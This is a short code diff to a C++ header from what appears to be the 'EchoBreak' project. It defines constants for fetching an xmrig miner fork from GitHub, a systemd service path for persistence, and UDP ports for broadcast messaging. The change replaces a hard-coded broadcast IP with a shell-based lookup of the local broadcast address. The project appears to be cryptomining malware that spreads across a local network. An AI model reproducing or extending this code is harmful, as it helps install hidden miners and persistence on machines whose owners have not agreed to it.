@@ -9,7 +9,6 @@
 #define REC_PORT 6969
 #define SENDING_PORT 6868
 #define BUFFER_SIZE 256
-#define BROADCAST_IP "172.17.213.255"
 #define MINER_GH std::string("https://github.com/xmr-rx0/EchoBreak-xmrig.git")
 #define SERVICE "/etc/systemd/system/eb.service";
 
@@ -55,7 +54,7 @@ private:
 
 private:
     const std::string m_service = SERVICE;
-    std::string m_broadcast_ip = BROADCAST_IP; // TODO: implement auto bc ip
+    std::string m_broadcast_ip;
 
     uint m_msg_count = 1; // number of message to receive (is useful when ping)
 
@@ -110,4 +109,8 @@ static std::string exec(const char *cmd)
     }
 
     return result;
+}
+
+static std::string getBroadCastAddress(){
+    return exec("INTERFACE=$(ip route show default | awk \'{print $5}\') && ip -4 addr show $INTERFACE | awk \'$1 == \"inet\" {print $4}'");
 }
